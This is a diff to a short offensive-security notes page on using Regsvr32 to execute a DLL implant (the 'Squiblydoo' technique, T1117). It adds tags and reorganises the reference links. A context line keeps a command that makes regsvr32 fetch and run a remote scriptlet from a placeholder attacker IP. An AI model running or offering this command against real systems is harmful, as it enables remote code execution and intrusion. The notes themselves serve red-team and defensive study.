@@ -1,6 +1,15 @@
+---
+author(s):
+  - Userware
+tags:
+  - initial-access
+  - weaponization
+  - client-side-attacks
+  - living-off-the-land
+  - T1117
+  - windows
+---
 # Regsvr32
-
-Search Tag(s): #T1117
 
 Execute DLL implant.
 
@@ -29,6 +38,14 @@ C:\> regsvr32.exe /s /u /i://<attacker_IP>/@snare scrobj.dll
 ---
 ## References
 
-https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/
+### LOLBAS
 
-https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo
+- [LOLBAS: Regsvr32](https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/)
+
+### Hacktricks
+
+- [Hacktricks: Windows Reverse Shells](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/windows)
+
+### Red Team Notes
+
+- [Red Team Notes: Code Execution - Regsvr32](https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo)
